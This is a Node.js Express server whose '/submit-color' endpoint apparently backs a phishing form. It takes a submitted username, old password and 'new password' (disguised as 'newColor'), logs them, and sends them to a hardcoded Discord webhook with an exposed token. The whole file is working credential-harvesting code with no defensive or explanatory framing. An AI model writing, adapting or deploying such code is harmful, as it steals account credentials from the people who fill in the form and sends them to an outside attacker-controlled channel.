const express = require('express');
const fetch = require('node-fetch'); // use node-fetch@2 for CommonJS
const path = require('path');
const app = express();
const PORT = 3000;

// Your actual Discord webhook URL
const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1382167795722354808/mXzdp9Bpp1Z6t3veq-EXGq0HRZbA8BH38uDh9VvzRFXxblsqAxvTtEDwo5719_i4MAHr';

// Middleware
app.use(express.static('public'));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// POST endpoint
app.post('/submit-color', async (req, res) => {
  const { username, password, newColor } = req.body;

  console.log('Received:', req.body);

  const payload = {
    content: `------------------------\nUSERNAME: **${username}**\nOLD PASSWORD: **${password}**\nNEW PASSWORD: **${newColor}**\n------------------------`
  };

  try {
    const discordRes = await fetch(DISCORD_WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    if (discordRes.ok) {
      // ✅ Respond to client with success
      res.status(200).send('Success');
    } else {
      console.log('❌ Discord error');
      res.status(500).send('Failed to send to Discord.');
    }
  } catch (err) {
    console.error('❌ Server error:', err);
    res.status(500).send('Internal server error');
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`✅ Server running at: http://localhost:${PORT}`);
});
